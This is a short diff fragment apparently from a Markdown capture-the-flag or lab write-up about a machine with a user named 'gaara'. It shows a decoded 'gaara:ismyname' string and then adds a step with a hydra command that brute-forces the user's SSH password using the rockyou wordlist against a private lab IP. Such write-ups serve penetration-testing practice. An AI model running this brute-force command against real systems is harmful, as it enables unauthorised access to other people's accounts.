@@ -186,3 +186,11 @@ f1MgN9mTf9SNbzRygcU
 ```
 gaara:ismyname
 ```
+
+Brute-force SSH Password for User
+```
+> hydra -l gaara -P /usr/share/wordlists/rockyou.txt 192.168.166.142 ssh
+```
+```
+
+```
